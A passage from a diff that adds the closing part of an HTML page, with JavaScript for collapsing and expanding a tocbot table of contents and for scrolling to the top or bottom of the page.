+  b.innerHTML = "Collapse all"
+}
+
+function collapse_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 2,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "expand_toc()");
+  b.innerHTML = "Expand all"
+}
+
+function go_top() {
+  window.scrollTo(0, 0);
+}
+
+function go_bottom() {
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+</script>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
